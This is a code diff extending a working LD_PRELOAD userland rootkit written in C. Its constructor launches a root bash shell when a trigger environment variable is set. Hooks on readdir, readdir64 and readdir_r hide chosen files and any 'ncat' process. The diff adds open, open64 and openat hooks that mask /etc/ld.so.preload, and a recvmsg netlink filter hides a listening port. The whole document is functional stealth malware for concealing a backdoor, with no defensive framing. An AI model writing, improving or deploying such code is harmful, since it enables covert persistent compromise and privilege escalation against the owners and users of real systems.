@@ -5,6 +5,9 @@
 #include <string.h>
 #include <dirent.h>
 #include <dlfcn.h>
+#include <fcntl.h>
+#include <stdarg.h>
+#include <sys/stat.h>
 #include <sys/socket.h>
 #include <linux/netlink.h>
 #include <linux/inet_diag.h>
@@ -13,28 +16,24 @@
 
 /* --- Configuration --- */
 #define NAME_TO_HIDE "ncat"
-#define PORT_TO_HIDE_HEX "1F90" 
+#define PORT_TO_HIDE_HEX "1F40" 
 #define TARGET_PORT 8000        
 #define HIDE_LIST "secret_dir,libhide.so.2,ld.so.preload.dummy"
+#define PRELOAD_PATH "/etc/ld.so.preload"
+#define DUMMY_PRELOAD "/etc/ld.so.preload.dummy"
 
-/* --- 1. Constructor (Root Shell Logic) --- */
-// This runs automatically when the shared library is loaded
+/* --- 1. Constructor --- */
 void __attribute__((constructor)) init() {
     if (getenv("rootshell")) {
-        // Clear environment to prevent recursion and detection
         unsetenv("rootshell");
         unsetenv("LD_PRELOAD");
-
-        // Attempt to escalate privileges
         setuid(0);
         setgid(0);
-        
-        // Replace current process with a root bash shell
         execl("/bin/bash", "bash", NULL);
     }
 }
 
-/* --- 2. Helper Logic --- */
+/* --- 2. Helpers --- */
 
 static int should_hide_file(const char *name) {
     if (!name) return 0;
@@ -49,15 +48,29 @@ static int should_hide_file(const char *name) {
 
 static int is_target_pid(const char *name) {
     if (!name || name[0] < '0' || name[0] > '9') return 0;
-    char path[64], buf[64];
-    snprintf(path, sizeof(path), "/proc/%s/comm", name);
+    
+    char path[256], buf[256];
     static FILE* (*orig_fopen)(const char*, const char*) = NULL;
     if (!orig_fopen) orig_fopen = dlsym(RTLD_NEXT, "fopen");
+
+    // Check process name (comm)
+    snprintf(path, sizeof(path), "/proc/%s/comm", name);
     FILE *f = orig_fopen(path, "r");
-    if (!f) return 0;
-    int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
-    fclose(f);
-    return found;
+    if (f) {
+        int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
+        fclose(f);
+        if (found) return 1;
+    }
+
+    // Check full command line (cmdline)
+    snprintf(path, sizeof(path), "/proc/%s/cmdline", name);
+    f = orig_fopen(path, "r");
+    if (f) {
+        int found = (fgets(buf, sizeof(buf), f) && strstr(buf, NAME_TO_HIDE));
+        fclose(f);
+        if (found) return 1;
+    }
+    return 0;
 }
 
 static int is_target_msg(struct nlmsghdr *nlh) {
@@ -75,8 +88,7 @@ struct dirent *readdir(DIR *dirp) {
     if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
     struct dirent *e;
     while ((e = orig(dirp))) {
-        if (should_hide_file(e->d_name)) continue; 
-        if (is_target_pid(e->d_name)) continue;    
+        if (should_hide_file(e->d_name) || is_target_pid(e->d_name)) continue; 
         return e;
     }
     return NULL;
@@ -87,11 +99,62 @@ struct dirent64 *readdir64(DIR *dirp) {
     if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
     struct dirent64 *e;
     while ((e = orig(dirp))) {
-        if (should_hide_file(e->d_name)) continue; 
-        if (is_target_pid(e->d_name)) continue;    
+        if (should_hide_file(e->d_name) || is_target_pid(e->d_name)) continue; 
         return e;
     }
     return NULL;
+}
+
+// Silencing the deprecation warning for readdir_r
+#pragma GCC diagnostic push
+#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
+int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
+    static int (*orig)(DIR*, struct dirent*, struct dirent**) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readdir_r");
+    int ret = orig(dirp, entry, result);
+    if (ret == 0 && *result != NULL) {
+        if (should_hide_file((*result)->d_name) || is_target_pid((*result)->d_name)) {
+            return readdir_r(dirp, entry, result);
+        }
+    }
+    return ret;
+}
+
+
+int open(const char *pathname, int flags, ...) {
+    static int (*orig_open)(const char*, int, mode_t) = NULL;
+    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args; va_start(args, flags);
+        mode = va_arg(args, mode_t); va_end(args);
+    }
+    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_open(DUMMY_PRELOAD, flags, mode);
+    return orig_open(pathname, flags, mode);
+}
+
+int open64(const char *pathname, int flags, ...) {
+    static int (*orig_open64)(const char*, int, mode_t) = NULL;
+    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args; va_start(args, flags);
+        mode = va_arg(args, mode_t); va_end(args);
+    }
+    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_open64(DUMMY_PRELOAD, flags, mode);
+    return orig_open64(pathname, flags, mode);
+}
+
+int openat(int dirfd, const char *pathname, int flags, ...) {
+    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
+    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list args; va_start(args, flags);
+        mode = va_arg(args, mode_t); va_end(args);
+    }
+    if (pathname && strstr(pathname, PRELOAD_PATH)) return orig_openat(dirfd, DUMMY_PRELOAD, flags, mode);
+    return orig_openat(dirfd, pathname, flags, mode);
 }
 
 char *fgets(char *s, int size, FILE *stream) {
@@ -116,12 +179,10 @@ ssize_t recvmsg(int sockfd, struct msghdr *msg, int flags) {
             char *next_msg = (char *)nlh + msg_len;
             int bytes_after = remaining - msg_len;
             if (bytes_after > 0) memmove(nlh, next_msg, bytes_after);
-            ret -= msg_len;
-            remaining -= msg_len;
+            ret -= msg_len; remaining -= msg_len;
             continue; 
         }
         nlh = NLMSG_NEXT(nlh, remaining);
     }
     return ret;
 }
-
